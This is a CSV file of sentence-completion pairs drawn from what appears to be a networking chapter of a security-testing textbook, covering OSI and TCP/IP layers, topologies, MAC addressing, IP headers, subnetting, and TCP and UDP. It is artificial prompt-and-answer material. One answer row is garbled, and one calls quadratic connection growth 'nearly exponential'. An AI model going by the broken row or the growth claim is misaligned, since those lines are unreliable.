sentence,answer
"this is a layer 2 address , identifying the network interface on the","this is a layer 2 address , identifying the network interface on the network so communications can get from one system to another on the local network"
"the address resolution protocol ( arp ) , virtual local area networks (","the address resolution protocol ( arp ) , virtual local area networks ( vlans ) , ethernet , and frame relay are data link layer protocols"
one of the problems with the osi model is that there are not,one of the problems with the osi model is that there are not always good fits when it comes to mapping protocols to the seven layers
"as an example , at which layer does the secure shell ( ssh ) protocol live ? is it the session layer because it ultimately","as an example , at which layer does the secure shell ( ssh ) protocol live ? is it the session layer because it ultimately manages sessions , or is it the presentation layer because it includes encryption mechanisms and negotiates them ? other protocols seem to exist between layers"
"arp , for instance , is said to operate at the data link layer , but it needs","arp , for instance , is said to operate at the data link layer , but it needs to know about the network layer because it provides the bridge between the addressing in those two layers"
"additionally , it ’ s entirely possible your device isn ’ t even doing","additionally , it ’ s entirely possible your device isn ’ t even doing any routing but instead it may be bridging to your provider ’ s net-work"
"over the next few years , it grew far beyond the","over the next few years , it grew far beyond the initial two and then three nodes that were connected in 1968–69"
"as more systems were connected to the network , the people responsible for","as more systems were connected to the network , the people responsible for man-aging the network and developing the protocols used to exchange information learned a lot"
"the initial protocol was the 1822 protocol that defined communications to the interface message processor ( imp ) , which was","the initial protocol was the 1822 protocol that defined communications to the interface message processor ( imp ) , which was a large computer with specialized interfaces acting as a message gateway ( think of it as a very primitive router )"
"by 1983 , after many years of development , the ncp was replaced entirely by a","by 1983 , after many years of development , the ncp was replaced entirely by a suite of protocols now commonly called transmission control protocol ( tcp ) /internet protocol ( ip )"
the way the suite of protocols used within tcp/ip works is slightly,the way the suite of protocols used within tcp/ip works is slightly transmission control protocol/internet protocol ( tcp/ip ) way the osi model is described
"for this reason , the suite is sometimes referred to as a model , but it may also be","for this reason , the suite is sometimes referred to as a model , but it may also be referred to as an architecture , since it ’ s a description of an as-built design rather than something conceptual"
"the tcp/ip architecture is a much simpler design than the osi model , which is an immediate difference","the tcp/ip architecture is a much simpler design than the osi model , which is an immediate difference and a reflection of the as-built nature of the design as compared with the conceptual design of the osi"
since the osi model had to be abstract and flexible in order to accommodate a wide,"since the osi model had to be abstract and flexible in order to accommodate a wide variety of protocols and designs , it was broken out into the seven functional categories described earlier"
"essentially what happens is that the session , presentation , and application layers","essentially what happens is that the session , presentation , and application layers from the osi model are collapsed into the application layer in the tcp/ip model"
"additionally , the physical and data link layers from the osi","additionally , the physical and data link layers from the osi model are collapsed into the link layer in the tcp/ip model"
"anything related to the applica-tion communication , including any session","anything related to the applica-tion communication , including any session management and data formatting , is in the application layer"
"regardless of which model you prefer to think about networking in , you","regardless of which model you prefer to think about networking in , you ’ ll find that protocols don ’ t generally sprawl across multiple layers"
"they are designed to fill the require-ments of a specific function ,","they are designed to fill the require-ments of a specific function , which will land pretty squarely into one of the layers of each model"
"in the rest of the chapter , and fairly commonly in the real world in my experience , when","in the rest of the chapter , and fairly commonly in the real world in my experience , when you see a reference to layers , the reference is to the osi model and not the tcp/ip architecture"
"topologies the way networks are designed also uses conceptual models , as a way","topologies the way networks are designed also uses conceptual models , as a way of taking a rat maze of physical networks and mapping them to a logical representation"
"this is not only about getting a logical map of the network , but also","this is not only about getting a logical map of the network , but also helps to identify how everything is connected since it will help to isolate potential issues"
"some will be found in service provider networks ,","some will be found in service provider networks , while others are more commonly found in local area networks"
"in our case , it ’ s a communication channel (","in our case , it ’ s a communication channel ( a single network cable ) that allows the communication between multiple comput-ers"
the t-connector provides a way to extract the signal from the,the t-connector provides a way to extract the signal from the bus in order to provide connec-tivity to the systems on the network
star network when you see a diagram of a star,"star network when you see a diagram of a star network , it will often look similar to the bus network"
"the difference between the bus and the star network , however","the difference between the bus and the star network , however , is that there is a mediating device between all the devices"
"this may be a hub , if you have a very old network","this may be a hub , if you have a very old network , which is a dumb electrical repeater , or you may have a switch"
"in the case of this diagram , the central line you see ,","in the case of this diagram , the central line you see , which looks like a bus , is really a switch or a hub"
"a switch , which is the most common device in a","a switch , which is the most common device in a star network topology , acts at layer 2 of the osi model"
ring network a ring network is similar to a bus network in the sense that,ring network a ring network is similar to a bus network in the sense that all of the nodes on the network appear to be connected on a contiguous network segment
the reason it ’ s a logical representation is because,"the reason it ’ s a logical representation is because physically , this is not how these networks are wired"
"in a token ring network , systems are wired as though they","in a token ring network , systems are wired as though they are in a star , using multistation access units ( maus )"
"just as when you are sitting around a campfire in an aboriginal tribe , where only the person with the","just as when you are sitting around a campfire in an aboriginal tribe , where only the person with the stick gets to talk , a token ring net-work uses a digital representation of the talking stick called a token"
this will theoretically avoid the problem with collisions except that sometimes the,"this will theoretically avoid the problem with collisions except that sometimes the token gets lost , which means a new token has to get generated"
"after the new token gets generated , it ’ s possible for the old token","after the new token gets generated , it ’ s possible for the old token to suddenly get “ found ” again , meaning there are two tokens on the network"
"in spite of a ring network behaving like a bus network , there","in spite of a ring network behaving like a bus network , there isn ’ t a need for terminators as there is in a bus network"
"to get from one system to another , if they are not","to get from one system to another , if they are not wired together directly , a system has to pass through another system"
"if a system in the middle of the bus network fails ,","if a system in the middle of the bus network fails , there is a potential for the entire network to fail along with it"
the system essentially acts like a terminator by,the system essentially acts like a terminator by not allowing the electrical signal to pass through it
"if a system in a mesh network fails , there","if a system in a mesh network fails , there is probably another pathway to get between one system and another"
"7 mesh network while you can connect systems together in multiple ways in a mesh network , in spite of the","7 mesh network while you can connect systems together in multiple ways in a mesh network , in spite of the orderliness that the circular design of the network shows , a couple of failures can potentially isolate nodes in a mesh network"
"the more pathways to get from one system to another , the","the more pathways to get from one system to another , the less chance failure will be cata-strophic , meaning communication doesn ’ t happen"
you can keep adding connections until every system,you can keep adding connections until every system has connections to every other system on the network
you add the same number of connections as you,"you add the same number of connections as you have existing nodes , so your connections increase nearly exponentially"
"in fact , in order to determine the number of connections you","in fact , in order to determine the number of connections you have , you can use the formula n ( n-1 ) /2"
"every system has a connection to every other system except itself , which is why","every system has a connection to every other system except itself , which is why we multiply the number of systems by one less than the number of systems ( e"
"however , there are circumstances where blending multiple network topologies","however , there are circumstances where blending multiple network topologies is the right way to go about con-necting your network together"
if you have switches capable of 64 network connections but you have 200 users that you need,"if you have switches capable of 64 network connections but you have 200 users that you need to connect to your local network , you would need to add a bus into your network topology"
"then from each switch , you have the traditional star where","then from each switch , you have the traditional star where all the connections come back to the switch they are connected to"
"because we aren ’ t likely going to be working at service providers or telecom-munications providers as we are doing security testing , at least not on the","because we aren ’ t likely going to be working at service providers or telecom-munications providers as we are doing security testing , at least not on the provider side of the network , we aren ’ t going to worry about protocols like frame relay , asynchronous transfer mode , or fiber distributed data interface"
the protocol you will almost exclu-sively run across,the protocol you will almost exclu-sively run across when we are talking about physical networking is ethernet
each layer of the network stack has a different term to,each layer of the network stack has a different term to refer to the chunk of data encap- sulated by that layer
because the mac address is hard-coded into the hardware of the,"because the mac address is hard-coded into the hardware of the interface , it is sometimes referred to as the hardware address"
since it ’ s also the address that is used by a physical,"since it ’ s also the address that is used by a physical piece of hardware , it is sometimes referred to as a physical address"
this is also called the vendor id because it,this is also called the vendor id because it identifies the name of the company that manufactured the inter-face
mac addresses the mac address is represented in hexadecimal values,mac addresses the mac address is represented in hexadecimal values because it ’ s a common way to represent octets
you may also run into this when looking at,you may also run into this when looking at ip addresses and certainly anytime you do a hexadecimal dump
"what this means , though , is that traffic that is in some way addressed to the interface , either directly to","what this means , though , is that traffic that is in some way addressed to the interface , either directly to its address or to the broadcast address for example , will get forwarded up to the operating system from the network interface"
switching is what happens when deci-sions about forwarding,switching is what happens when deci-sions about forwarding messages are made based on the physical address
"because having to perform a lookup of which port to forward a message to takes time , which will","because having to perform a lookup of which port to forward a message to takes time , which will slow down message transmission , it ’ s essential that the lookup be as fast as possi - ble"
this is generally accomplished through the use,this is generally accomplished through the use of something called content-addressable memory ( cam )
"instead of an array of data indexed with numeric values , meaning we look up a value by using something like array","instead of an array of data indexed with numeric values , meaning we look up a value by using something like array [ 5 ] to get the value at index 5 in the array , we use a mac address as the index value"
"what a switch does , which is the value of switching , is make","what a switch does , which is the value of switching , is make determinations about what traffic goes to which port based on the destination mac address"
this improves performance because you can fill the network connection with traffic specific to the system,this improves performance because you can fill the network connection with traffic specific to the system connected to the switch port rather than flooding it with all the other traffic on the network
"when performing security testing , acting like an attacker , it ’","when performing security testing , acting like an attacker , it ’ s more convenient to be able to see more traffic than that"
"one of them , if you have some control over the switch ,","one of them , if you have some control over the switch , is to tell the switch to mirror traffic on one port to another port"
"another way is to fool the switch into sending traffic to you ,","another way is to fool the switch into sending traffic to you , which involves methods of attack that we ’ ll cover in later chapters"
"certainly there are other protocols that exist at the network layer , such as the internet packet exchange (","certainly there are other protocols that exist at the network layer , such as the internet packet exchange ( ipx ) , but as the internet runs on ip and its associated protocols , we ’ ll focus there"
"as each layer is passed through , a set of data is","as each layer is passed through , a set of data is added to the message that is specific to the protocol processing the message"
"you may hear every set of data on the network referred to as a packet ,","you may hear every set of data on the network referred to as a packet , but from a technical standpoint , a message from the ip header down is a packet"
this is an aspect people who work with net - working are often fairly,"this is an aspect people who work with net - working are often fairly familiar with , but it ’ s useful to understand what an address comprises"
"this can be challenging to understand , but there are","this can be challenging to understand , but there are some mathematical tricks that can help , once you know them"
there are also a cou - ple of different ways to render the,"there are also a cou - ple of different ways to render the subnet mask , and you ’ ll often run across both of them"
"it hasn ’ t happened yet , but every modern device and operating sys - tem","it hasn ’ t happened yet , but every modern device and operating sys - tem supports ipv6 , so you will see the ipv6 address on most systems you will interact with"
headers the internet engineering task force ( ietf ) is responsible,headers the internet engineering task force ( ietf ) is responsible for maintaining all of the docu - mentation related to protocols
"when someone , or more commonly a group of people , wants to propose a new protocol or","when someone , or more commonly a group of people , wants to propose a new protocol or an extension to an existing protocol , they write something called a request for comments ( rfc ) document"
the very first rfc was written in 1969 and was related to the host software,the very first rfc was written in 1969 and was related to the host software for the imp that was used to interface a computer sys - tem to the arpanet
"at the time , of course , the ietf didn ’ t exist","at the time , of course , the ietf didn ’ t exist , but using rfcs was still the process for creating specifications and standards"
this is the same set of headers that would be,this is the same set of headers that would be pre-sented in the form of a table in the rfc referenced
the difference between the table form and just looking at the headers in this way,"the difference between the table form and just looking at the headers in this way is that with the table , you can clearly see the size of each header field"
9 ip headers the following are the header fields with their descriptions and,9 ip headers the following are the header fields with their descriptions and sizes : version this field indicates which version of ip is in this packet
"because the header is based on 32-bit words , which is 4 bytes ,","because the header is based on 32-bit words , which is 4 bytes , you can get the number of bytes by mul- tiplying this value by 4"
"in the case of this example , you ’ ll find that the headers","in the case of this example , you ’ ll find that the headers are 20 bytes ( five words ) , which is common for an ip header"
type of service the rfc calls this the type of service ( tos ) field,"type of service the rfc calls this the type of service ( tos ) field , though you ’ ll also see it referred to as the differentiated services field"
this field helps network elements make qual- ity of service,this field helps network elements make qual- ity of service ( qos ) decisions by prioritizing some messages and deprioritizing others
total length this is the total length of the,"total length this is the total length of the message , including the ip header and any subsequent data"
"identification sometimes , there is too much data being sent to fit","identification sometimes , there is too much data being sent to fit into the maximum length allowed based on the size of the length field"
"a message that is self-contained , meaning it didn ’","a message that is self-contained , meaning it didn ’ t require any fragmenting , would have this bit clear"
"fragment offset the fragment offset field , 13 bits","fragment offset the fragment offset field , 13 bits long , indicates where the data in the packet aligns"
time to live the time to live ( ttl ) field indicates how long,time to live the time to live ( ttl ) field indicates how long a message can live on the network before it is considered to be expired
"since the packet may pass through multiple network devices in a second , the initial definition of this field isn ’ t","since the packet may pass through multiple network devices in a second , the initial definition of this field isn ’ t relevant anymore and the ttl really indicates the number of network devices ( routing devices , essentially ) the message can pass through"
bytes you will sometimes see the term octet used and you may be wondering why we use the term,bytes you will sometimes see the term octet used and you may be wondering why we use the term octets instead of bytes since what we are referring to is a value that is 8 bits in length
most networks will do something to block source addresses from these ranges coming into,"most networks will do something to block source addresses from these ranges coming into their space , since they should never be originating from the outside of a network"
"the ranges for these private addresses , meant to be used by","the ranges for these private addresses , meant to be used by any network that doesn ’ t have public ip addresses , are 10"
you may also have noticed that the number of devices that,you may also have noticed that the number of devices that are connecting to the internet is increasing at a nearly exponential rate
the stopgap for this is to use private address,"the stopgap for this is to use private address ranges on the inside of networks , especially home networks"
because it would be very awkward to write an ipv6 in dotted octet form,"because it would be very awkward to write an ipv6 in dotted octet form as we do with ipv4 , addresses in ipv6 are written in a different form"
because an octet can be represented with two hexadeci-mal digits,"because an octet can be represented with two hexadeci-mal digits , you will see ipv6 addresses represented in that way"
"since there are 16 octets in an ipv6 address ,","since there are 16 octets in an ipv6 address , the longest address you will run across will be 32 characters"
"in addition to the address being broken up into byte pairs , like fe80 , you ’","in addition to the address being broken up into byte pairs , like fe80 , you ’ ll notice there is a part of the address that has a colon pair with nothing in between"
a message sent to the anycast address will be delivered,a message sent to the anycast address will be delivered to just one of the hosts in the anycast group
"multicast addresses will look like the other addresses , but they are formatted based on","multicast addresses will look like the other addresses , but they are formatted based on the fact that they are multicast addresses and on the application that is using the address"
one of the reasons it ’ s important is that you may,one of the reasons it ’ s important is that you may need to know what addresses belong to your target based on a subnet
"if you don ’ t get the subnet boundaries correct , there is a chance","if you don ’ t get the subnet boundaries correct , there is a chance that you will start testing against systems that don ’ t belong to your target"
"because of that , we ’ ll spend a little time here","because of that , we ’ ll spend a little time here talking about what subnets are and how to determine the boundaries of subnets"
"in part because of this , a part of the ip","in part because of this , a part of the ip address belongs to the host and part belongs to the network"
this segmentation of the address also helps systems to know what,"this segmentation of the address also helps systems to know what addresses are local , meaning the communications stay on the local network"
the way systems are told what are local networks and what are not,the way systems are told what are local networks and what are not local networks is that a subnet mask is paired with the ip address
"to determine what portion of an ip address belongs to the network ,","to determine what portion of an ip address belongs to the network , you look at the bits that are set to 1 in the subnet mask"
"as a result , subnet masks can have only certain values : 0 , 128","as a result , subnet masks can have only certain values : 0 , 128 , 192 , 224 , 240 , 248 , 252 , 254 , and 255"
this is because every posi-tion is a power of two and,this is because every posi-tion is a power of two and we add on from the most significant bit on the left-hand side
looking at the subnet mask above and applying binary to decimal,"looking at the subnet mask above and applying binary to decimal translation , we can see that the subnet mask is 255"
this is where we need to start applying the ip address,this is where we need to start applying the ip address to the subnet mask in order to get the address range
"i can only vary the last octet , and i am constrained because","i can only vary the last octet , and i am constrained because i can ’ t change the value in the most significant bit position"
"the subnet mask used above translates to /25 , and i","the subnet mask used above translates to /25 , and i would indicate the subnet with the ip address by indicating 172"
let ’ s say you want to know how many addresses,let ’ s say you want to know how many addresses belong to a particular network block and you have the cidr notation
"if you want to know how many hosts , you just divide","if you want to know how many hosts , you just divide by 2 or multiply by 2 for every bit change in the prefix"
"if you go to a /25 , that means you get 128 possible values ( divide","if you go to a /25 , that means you get 128 possible values ( divide by 2 because you added a prefix bit , meaning you lost a host bit )"
"if you go the other direction to a /23 , you double because","if you go the other direction to a /23 , you double because you lost a prefix bit , meaning it got added to the host portion"
"if the fi rst octet is used for the network designation and all others are used for the host values , you would have all the","if the fi rst octet is used for the network designation and all others are used for the host values , you would have all the bit positions in that fi rst byte fi lled up , which means you are using 8 bits , leaving you with a cidr designation of /8"
this leaves the remaining 78 bits ( keep in mind,this leaves the remaining 78 bits ( keep in mind that ipv6 addresses are 128 bits long ) for the host
"where ip is a best-effort proto-col , meaning that a best effort is made to","where ip is a best-effort proto-col , meaning that a best effort is made to get messages from one system to another , tcp is said to have guaranteed delivery"
"instead , what it means is there are mechanisms in the protocol that keep track of all of the messages that","instead , what it means is there are mechanisms in the protocol that keep track of all of the messages that are sent , and if something doesn ’ t get to the other end and acknowledged there , messages will be resent"
where previous addresses are related to the systems to ensure messages get from one system to another,"where previous addresses are related to the systems to ensure messages get from one system to another , at the transport layer , we start to become concerned about getting messages to the application"
"tcp is defi ned in rfc 793 , and it was also written","tcp is defi ned in rfc 793 , and it was also written in 1981 , which means tcp has been around for a very long time"
"if the server is send-ing from the server to the client , the destination","if the server is send-ing from the server to the client , the destination port is the ephemeral port assigned to the application that is communicating with the server"
"using the sequence number , the sender tells","using the sequence number , the sender tells the recipient where in the conversation this message falls"
the reason for this is that the packet capture software shows a,"the reason for this is that the packet capture software shows a 0 and then presents relative sequence numbers , which are easier to follow"
acknowledgment number the acknowledgment number is the opposite,acknowledgment number the acknowledgment number is the opposite side of the con- versation from the sequence number
where the sequence number is set from the sender,"where the sequence number is set from the sender , the acknowledgment number is set from the recipient"
this tells the sender where in the commu- nication stream the recipient is,"this tells the sender where in the commu- nication stream the recipient is , which lets the sender know whether anything has been lost in transmission"
"the syn flag is the synchronize flag , indicating","the syn flag is the synchronize flag , indicating that the sequence number is set and should be recorded"
"the rst flag resets the connec-tion , which may happen","the rst flag resets the connec-tion , which may happen if a message is received that appears to be in error"
window the value in the window field tells the,window the value in the window field tells the recipient how many bytes the sender is willing to accept
"a smaller window size means more acknowledgments are necessary , which","a smaller window size means more acknowledgments are necessary , which may be an indica-tion that the communication channel isn ’ t reliable"
"essentially , the urgent pointer says the data from the current sequence","essentially , the urgent pointer says the data from the current sequence number up until the value in the urgent pointer is urgent data"
if the options leave the header length short of that alignment,"if the options leave the header length short of that alignment , padding bits are necessary to fill the remainder of the header"
the handshake ensures that both sides of the conversation,the handshake ensures that both sides of the conversation are live and active because they are expected to respond
this sets the ack flag and increments the initial sequence,"this sets the ack flag and increments the initial sequence number by one , indicating the first message was received"
"keep in mind that the conversation is two-way , so both","keep in mind that the conversation is two-way , so both sides have to keep track of where they are in the conversation"
each side keeps track of a sequence number for,each side keeps track of a sequence number for their side and an acknowledgment number for the other side
the final message in the handshake is one that just has the ack flag,the final message in the handshake is one that just has the ack flag set and the acknowledgment field increments the sequence number set in the syn/ack message
"if either side were attempting to spoof a conversation , they wouldn ’ t","if either side were attempting to spoof a conversation , they wouldn ’ t receive the messages and , as a result , wouldn ’ t respond correctly"
"since the sequence number maintains the number of bytes that have been sent ,","since the sequence number maintains the number of bytes that have been sent , the acknowledgment number tells the sender whether any data has gone missing in transmission"
"additionally , the sequence and acknowledgment numbers ensure","additionally , the sequence and acknowledgment numbers ensure the correct order of messages at the recipient"
"if messages arrive out of order , the sequence numbers indicate","if messages arrive out of order , the sequence numbers indicate whether messages should be held for a message that got lost"
this is also a part of guaran-teed delivery—making sure that the messages not only,this is also a part of guaran-teed delivery—making sure that the messages not only arrive as expected but also are in the correct order when they get there
messages sent using udp are just put out on the wire with the hope that they will,"messages sent using udp are just put out on the wire with the hope that they will get to the destination because the network protocol , ip , will just take care of everything"
with the lighter weight comes very little overhead from things like,with the lighter weight comes very little overhead from things like establishing connections and making sure that messages get where they are going
it also doesn ’ t much matter which order,it also doesn ’ t much matter which order messages are received in from the standpoint of the protocol
the reason for this is that since there is no,"the reason for this is that since there is no connection , there may never be a response from the server"
a source port is required with tcp because there will always be a,"a source port is required with tcp because there will always be a response , even if it ’ s just used to complete the three-way handshake"
the only place responses to closed ports are mentioned that is relevant,the only place responses to closed ports are mentioned that is relevant is in the rfc for the internet control message protocol ( icmp )
any of those are legiti-mate scenarios in which you wouldn ’,any of those are legiti-mate scenarios in which you wouldn ’ t get a response to a message to a udp port
"one significant reason for that is that with udp , it ’ s","one significant reason for that is that with udp , it ’ s up to the application to do any reorder-ing of messages , as required"
if a datagram ( the pdu for udp ) comes in out,"if a datagram ( the pdu for udp ) comes in out of order with streaming video , the application will just discard it"
"in reality , that word would likely be transmitted all in one mes-sage ,","in reality , that word would likely be transmitted all in one mes-sage , but let ’ s say that each letter sound was transmitted in its own message"
"if you were to receive messages with the sounds l , h , l , o , and then e , what would it sound like to you ? our brains are really","if you were to receive messages with the sounds l , h , l , o , and then e , what would it sound like to you ? our brains are really good at piecing missing data together and constructing something that seems whole , but it could be your brain wouldn ’ t be able to make sense of the word as it sounded"
"even if your brain could understand it , it","even if your brain could understand it , it would sound weird and your overall experience would be bad"
why would messages come in out of order ? after,"why would messages come in out of order ? after all , we have very reliable internet service these days"
"however , the failure occurred while at least one of your messages was in flight ,","however , the failure occurred while at least one of your messages was in flight , and you have no way of knowing the message was just dropped due to a failure"
"even if it ’ s not a failure and messages are dropped , it could be that","even if it ’ s not a failure and messages are dropped , it could be that one message takes one route and a later message takes another route , which happens to be faster"
